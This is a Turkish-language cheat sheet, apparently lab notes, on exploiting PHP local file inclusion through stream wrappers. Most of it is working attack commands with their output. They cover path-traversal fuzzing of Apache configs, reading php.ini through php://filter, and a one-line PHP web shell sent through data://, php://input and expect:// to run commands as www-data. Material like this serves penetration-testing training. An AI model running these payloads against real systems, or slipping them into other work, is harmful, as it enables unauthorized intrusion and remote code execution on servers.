# PHP Wrappers

## PHP [Version](https://www.php.net/releases/) Fuzzing

```sh
my@attack:~$ ffuf -ic -w php-versions.txt:FUZZ -u "http://94.237.59.180:37581/index.php?language=../../../etc/apache2/mods-available/phpFUZZ.conf" -fs 0
```

## Wrapper [Data](https://www.php.net/manual/en/wrappers.data.php)

!!! abstract

    PHP yapılandırma dosyasında allow_url_include = On satırı mevcut olmalıdır.

[PHP Base64 Conversion Filter](https://www.php.net/manual/en/filters.convert.php) kullanarak ilgili PHP yapılandırma dosyasını elde et:

```sh
my@attack:~$ curl -s 'http://94.237.59.180:37581/index.php?language=php://filter/read=convert.base64-encode/resource=../../../etc/php/7.4/apache2/php.ini'
```

Dosyadan elde edilen Base64 dizisini çözerek allow_url_include ayarını kontrol et:

```sh
my@attack:~$ echo -n OyBXaGV0aGVyIHRvIGFsbG93IHRoZSB0cmVhdG1lbnQgb2YgVVJMcyAobGlrZSBodHRwOi8vIG9yIGZ0cDovLykgYXMgZmlsZXMuCjsgaHR0cDovL3BocC5uZXQvYWxsb3ctdXJsLWZvcGVuCmFsbG93X3VybF9mb3BlbiA9IE9uCgo7IFdoZXRoZXIgdG8gYWxsb3cgaW5jbHVkZS9yZXF1aXJlIHRvIG9wZW4gVVJMcyAobGlrZSBodHRwOi8vIG9yIGZ0cDovLykgYXMgZmlsZXMuCjsgaHR0cDovL3BocC5uZXQvYWxsb3ctdXJsLWluY2x1ZGUKYWxsb3dfdXJsX2luY2x1ZGUgPSBPbgoKOyBEZWZpbmUgdGhlIGFub255bW91cyBmdHAgcGFzc3dvcmQgKHlvdXIgZW1haWwgYWRkcmVzcykuIFBIUCdzIGRlZmF1bHQgc2V0dGluZwo7IGZvciB0aGlzIGlzIGVtcHR5Lgo7IGh0dHA6Ly9waHAubmV0L2Zyb20KO2Zyb209ImpvaG5AZG9lLmNvbSIKCjsgRGVmaW5lIHRoZSBVc2VyLUFnZW50IHN0cmluZy4gUEhQJ3MgZGVmYXVsdCBzZXR0aW5nIGZvciB0aGlzIGlzIGVtcHR5Lgo7IGh0dHA6Ly9waHAubmV0L3VzZXItYWdlbnQKO3VzZXJfYWdlbnQ9IlBIUCIKCjsgRGVmYXVsdCB0aW1lb3V0IGZvciBzb2NrZXQgYmFzZWQgc3RyZWFtcyAoc2Vjb25kcykKOyBodHRwOi8vcGhwLm5ldC9kZWZhdWx0LXNvY2tldC10aW1lb3V0CmRlZmF1bHRfc29ja2V0X3RpbWVvdXQgPSA2MAoKOyBJZiB5b3VyIHNjcmlwdHMgaGF2ZSB0byBkZWFsIHdpdGggZmlsZXMgZnJvbSBNYWNpbnRvc2ggc3lzdGVtcywKOyBvciB5b3UgYXJlIHJ1bm5pbmcgb24gYSBNYWMgYW5kIG5lZWQgdG8gZGVhbCB3aXRoIGZpbGVzIGZyb20KOyB1bml4IG9yIHdpbjMyIHN5c3RlbXMsIHNldHRpbmcgdGhpcyBmbGFnIHdpbGwgY2F1c2UgUEhQIHRvCjsgYXV0b21hdGljYWxseSBkZXRlY3QgdGhlIEVPTCBjaGFyYWN0ZXIgaW4gdGhvc2UgZmlsZXMgc28gdGhhdAo7IGZnZXRzKCkgYW5kIGZpbGUoKSB3aWxsIHdvcmsgcmVnYXJkbGVzcyBvZiB0aGUgc291cmNlIG9mIHRoZSBmaWxlLgo7IGh0dHA6Ly9waHAubmV0L2F1dG8tZGV0ZWN0LWxpbmUtZW5kaW5ncwo7YXV0b19kZXRlY3RfbGluZV9lbmRpbmdzID0gT2ZmCgo7IExpc3Qgb2YgaGVhZGVycyBmaWxlcyB0byBwcmVsb2FkLCB3aWxkY2FyZCBwYXR0ZXJucyBhbGxvd2VkLgo7ZmZpLnByZWxvYWQ9CmV4dGVuc2lvbj1leHBlY3QK | base64 -d | grep allow_url_include
```

```output title="Output"
allow_url_include = On
```

Data wrapper ile kullanmak üzere bir PHP web shell hazırla:

```sh
my@attack:~$ echo -n '<?php system($_GET["cmd"]); ?>' | base64 -w 0
```

```output title="Output"
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Base64 dizisini URL kodlaması ile kodla ve Data wrapper ile bir komut çalıştır:

```sh
my@attack:~$ curl -s 'http://94.237.59.180:37581/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Wrapper [Input](https://www.php.net/manual/de/wrappers.php.php)

!!! abstract

    PHP yapılandırma dosyasında allow_url_include = On satırı mevcut olmalıdır.

```sh
my@attack:~$ curl -s 'http://94.237.59.180:37581/index.php?language=php://input&cmd=id' -X POST -d '<?php system($_GET["cmd"]); ?>' | grep uid
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Wrapper [Expect](https://www.php.net/manual/en/wrappers.expect.php)

!!! abstract

    PHP yapılandırma dosyasında extension=expect satırı mevcut olmalıdır.

```sh
my@attack:~$ curl -s 'http://94.237.59.180:37581/index.php?language=expect://id' | grep uid
```

```output title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
